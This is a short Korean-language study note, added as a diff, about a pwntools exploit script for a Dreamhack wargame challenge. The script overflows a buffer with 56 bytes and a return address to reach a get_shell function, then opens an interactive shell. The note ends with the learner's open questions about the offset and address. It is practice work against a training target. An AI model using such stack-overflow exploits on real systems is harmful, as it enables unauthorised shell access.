@@ -1,0 +1,22 @@
+
+
+pwntools 를 이용하요 py 만들기
+
+------
+#!/usr/bin/python3
+from pwn import *
+
+context.log_level = 'debug'
+
+p = remote('host1.dreamhack.games', 19132)
+
+payload = b'a'*56+p64(0x4006aa)
+
+#p.recvuntil('Input: ')
+p.sendline(payload)
+p.interactive()
+
+-------
+
+context도 먼지 모르고 왜 버퍼크기는 38인데 56을 해야 버퍼오버플로우가 되고 
+왜 get_shell 의 주소값이 4006aa인지 모르겠다 이건 숙제인듯하다.
